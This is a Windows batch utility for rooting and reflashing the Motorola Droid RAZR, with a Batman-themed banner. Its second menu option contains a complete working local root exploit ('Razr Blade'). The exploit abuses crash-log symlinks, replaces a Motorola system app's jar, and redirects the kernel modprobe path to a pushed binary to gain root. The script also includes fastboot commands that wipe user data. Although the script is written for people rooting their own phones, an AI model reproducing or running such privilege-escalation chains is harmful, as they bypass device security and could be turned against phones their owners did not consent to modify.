::Visit DroidRZR.com

::Set our Window Title
@title DROID RAZR Utility 1.90 -- We will probably never hit 2.0.

::Set our default parameters
@echo off
color 0b



:menuLOOP

	call:header
	::Print our header
	::call:header
	
	::Load up our menu selections
	echo. 
	echo.
	for /f "tokens=1,2,* delims=_ " %%A in ('"C:/Windows/system32/findstr.exe /b /c:":menu_" "%~f0""') do echo.  %%B  %%C
	
	call:printstatus

	set choice=
	echo.&set /p choice= Please make a selection or hit ENTER to exit: ||GOTO:EOF
	echo.&call:menu_%choice%
	
GOTO:menuLOOP

:menu_1    Preparing ICS_to_Leak install. [Also works from JB Official to Leak]
cls
color 0b	
	echo [*] Simple Razr Restore
	echo [*] Windows Version
	echo [*] Created by mattlgroff
	echo [*]
	echo [*] Before continuing, ensure your Razr is in the
	echo [*] "AP Fastboot" mode and connected via USB.
echo. Be VERY aware! This WILL wipe your userdata, including contacts, apps, etc.
echo. I am not responsible if this wipes your internal sdcard, and you should 
echo. backup anything worth it to you to your external sdcard and computer before
echo. you choose to continue. You can exit now with the X button on this window.
echo. WARNING: Do not do this at LOW BATTERY! You have been warned!
echo. 	
echo. Press any key to continue.
pause > nul
moto-fastboot flash system system_ICS.img
moto-fastboot flash boot boot_LEAK.img
moto-fastboot flash preinstall preinstall_ICS.img
moto-fastboot -w
cls
echo. You are now ready to install the Jellybean Leak. Reboot to Recovery.
echo. To Reboot to Recovery from phone completely shut down:
echo. 1. Hold down both volume buttons and the power button to get into the
echo. Boot Menu which has the option "Recovery".
echo. 2. Scroll down with the Volume Down key, and Select the "Recovery"
echo. option with the Volume Up key.
echo. 3. An Andy the android will show up looking dead or fallen over. Here
echo. you will need to tap for a second both Volume buttons together.
echo. 4. Choose the file "ICS_to_Leak.zip" that you moved to your external
echo. SDcard from the /MOVE_TO_EXTERNAL_SDCARD/ folder in this utility zip.
echo. 5. Once that installs you can begin the root process in Option 2 by
echo. Dan Rosenberg (djrbliss) entitled RAZR_Blade.
	
	set choice=
	echo.&set /p choice= Please make a selection or hit ENTER to return: ||GOTO:EOF
	echo.&call:bootsubmenu_%choice%
color 0b	
cls
GOTO:EOF

:menu_2 Razr Blade: Motorola Droid Razr 4.1 Root Exploit by djrbliss
cls
color 0b
echo [*]
echo [*] Razr Blade: Motorola Droid Razr 4.1 Root Exploit (Windows version)
echo [*] by Dan Rosenberg (@djrbliss)
echo [*]
echo [*] Thanks to p3droid for assistance in testing.
echo [*]
echo [*] Note: this will not work on Razr HD, Razr M, etc.
echo [*]
echo [*] Before continuing, ensure USB debugging is enabled, that you
echo [*] have the latest Motorola drivers installed, and that your phone
echo [*] is connected via USB.
echo [*]
echo [*] Please carefully follow any instructions provided in the exploit.
echo [*]
echo [*] Press enter to root your phone...
pause > nul
echo [*] 

adb kill-server > nul
adb start-server > nul

echo [*] Waiting for device...
adb wait-for-device 

echo [*] Device found.
echo [*] Phase one...

adb shell "rm /data/dontpanic/apanic_console 2>/dev/null"
adb shell "ln /data/data/com.motorola.contextual.fw/files/DataClearJarDex.jar /data/dontpanic/apanic_console" 

echo [*] Rebooting device...
adb reboot
echo [*] Waiting for phone to reboot.
adb wait-for-device

echo [*] Phase two...
adb shell "cat /data/data/com.motorola.contextual.fw/files/DataClearJarDex.jar > /data/local/tmp/DataClearJarDex.jar.bak"

echo [*] Complete the following steps on your device:
echo [*] 1. Open the Smart Actions application.
echo [*] 2. Select "Get Started".
echo [*] 3. Select "Battery Saver".
echo [*] 4. Select "Save".
echo [*] 5. Press the Home button.
echo [*]
echo [*] Press enter here once you have completed the above steps.
pause
adb shell "sleep 5"
adb push pwn.jar /data/local/tmp/pwn.jar
adb shell "cat /data/local/tmp/pwn.jar > /data/data/com.motorola.contextual.fw/files/DataClearJarDex.jar"

echo [*] Rebooting device...
adb reboot
echo [*] Waiting for phone to reboot.
adb wait-for-device

echo [*] Phase three (this will take a minute)...
adb shell "sleep 40"

adb shell "mv /data/logger /data/logger.bak"
adb shell "mkdir /data/logger"
adb shell "chmod 777 /data/logger"
adb shell "rm /data/logger/last_apanic_console 2>/dev/null"
adb shell "ln -s /proc/sys/kernel/modprobe /data/logger/last_apanic_console"
adb shell "rm /data/dontpanic/apanic_console 2>/dev/null"
adb shell "echo /data/local/tmp/pwn > /data/dontpanic/apanic_console"

echo [*] Rebooting device...
adb reboot
echo [*] Waiting for phone to reboot.
adb wait-for-device

echo [*] Phase four...
adb push su /data/local/tmp
adb push busybox /data/local/tmp
adb push Superuser.apk /data/local/tmp
adb push pwn /data/local/tmp

adb shell "chmod 755 /data/local/tmp/pwn"
adb shell "/data/local/tmp/pwn trigger"

echo [*] Cleaning up...
adb shell "rm /data/dontpanic/* 2>/dev/null"
adb shell "rm /data/local/tmp/su 2>/dev/null"
adb shell "rm /data/local/tmp/Superuser.apk 2>/dev/null"
adb shell "rm /data/local/tmp/busybox 2>/dev/null"
adb shell "rm /data/local/tmp/pwn 2>/dev/null"
adb shell "su -c 'rm -r /data/logger' 2>/dev/null"
adb shell "su -c 'mv /data/logger.bak /data/logger'"
adb shell "cat /data/local/tmp/DataClearJarDex.jar.bak > /data/data/com.motorola.contextual.fw/files/DataClearJarDex.jar"
adb shell "rm /data/local/tmp/pwn.jar 2>/dev/null"
adb shell "rm /data/local/tmp/DataClearJarDex.jar.bak 2>/dev/null"

echo [*] Rebooting...
adb reboot
adb wait-for-device

echo [*] Exploit complete!
echo [*] Press any key to exit.
pause > nul
adb kill-server

	set choice=
	echo.&set /p choice= Please make a selection or hit ENTER to return: ||GOTO:EOF
	echo.&call:extrasubmenu_%choice%
color 0b	
cls
GOTO:EOF


:menu_3    Install Voodoo's OTA Rootkeeper App
cls
color 0b
echo. Make sure Debugging is enabled on your phone
echo. Press any key to install Voodoo's OTA Rootkeeper app.
pause > nul
adb kill-server > nul
adb start-server > nul
adb wait-for device install org.projectvoodoo.otarootkeeper-1.apk
echo. Done!
adb kill-server

	
	set choice=
	echo.&set /p choice= Please make a selection or hit ENTER to return: ||GOTO:EOF
	echo.&call:extrasubmenu_%choice%
color 0b	
cls	
GOTO:EOF

:menu_4    Preparing Leak_to_JB (official) install.
cls
color 0b	
echo. 
echo. Before continuing, ensure your Razr is in the
echo. "Recovery" mode and connected via USB.
echo. WARNING: Do not do this at LOW BATTERY! You have been warned!
echo. 	
echo. Press any key to continue.
pause > nul
cls
echo. 
echo. Haha jokes on you. You thought we'd be doing something crazy with 
echo. flashing files to your phone right? Wrong! This is just a How-To
echo. using the update file included already. You probably already did the
echo. hard work of putting the Leak_to_JB.zip on your external sdcard like
echo. you were told to do. This one is easy. Let's begin.
echo. Press any key to continue.
pause > nul
cls
echo. 
echo. 1. Install Voodoo's OTA Rootkeeper if you haven't already.
echo. 2. Open the app and choose the options as follows exactly:
echo. "Backup Root" : "Temp Unroot" : "Restore Root" : "Temp Unroot" : "Restore Root"
echo. 3. Reboot the phone to Recovery. 
echo. To Reboot to Recovery from phone completely shut down:
echo. a. Hold down both volume buttons and the power button to get into the
echo. Boot Menu which has the option "Recovery".
echo. b. Scroll down with the Volume Down key, and Select the "Recovery"
echo. option with the Volume Up key.
echo. c. An Andy the android will show up looking dead or fallen over. Here
echo. you will need to tap for a second both Volume buttons together.
echo. d. Choose the file "Leak_to_JB.zip" that you moved to your external
echo. SDcard from the /MOVE_TO_EXTERNAL_SDCARD/ folder in this utility zip.
	
	set choice=
	echo.&set /p choice= Please make a selection or hit ENTER to return: ||GOTO:EOF
	echo.&call:bootsubmenu_%choice%
color 0b	
cls
GOTO:EOF



:header  
cls        
color 0e
	echo.
	echo. Because it's the utility Gotham deserves, but not the one it needs right now. 
	echo. So, we'll hunt it, because it can take it. Because it's not our hero. 
	echo. It's a silent guardian. A watchful protector. A Dark Knight.			
	echo                              BATMAN BATMAN BATMAN 
	echo                     N BATM N BATM N  ATMAN  ATMAN BAT AN BAT
	echo                 ATMAN     AN BATMAN         ATMAN BAT      TMAN 
	echo             AN B         MAN BATMAN         ATMAN BATM          BATM
	echo           TMA            MAN BATMA           TMAN BATM             MAN 
	echo         BAT               AN BATM             MAN BAT               AN B
	echo       N BA      ***********************************************     BA
	echo       N B       *          Droid RAZR Utility 1.90            *      BAT
	echo      AN B       *           Created by mattlgroff             *      BAT
	echo       N B       *       Thank Dan Rosenberg for his work!     *     BA
	echo       N BA      ***********************************************     N BA
	echo         BAT        AN BAT     ATMAN          TMAN    MAN BATM      MAN 
	echo          ATMA      AN BATMA  BATMAN B      BATMAN B TMAN BAT      TMA 
	echo            MAN B    N BATMAN BATMAN BA   N BATMAN BATMAN BA   N BAT
	echo                BATMA  BATMAN BATMAN BAT AN BATMAN BATMAN  ATMAN 
	echo                    AN BATMAN BATMAN BAT AN BATMAN BATMAN BA
	echo                            N BATMAN BATMAN BATMAN B
	echo. Move all files in the /MOVE_TO_EXTERNAL_SDCARD/ to the external SDcard.
	echo. Press any key to open the utility.
pause > nul
cls	
color 0b
GOTO:EOF

:printstatus
	echo.
	echo. Too powerful to fall into the wrong hands.

GOTO:EOF
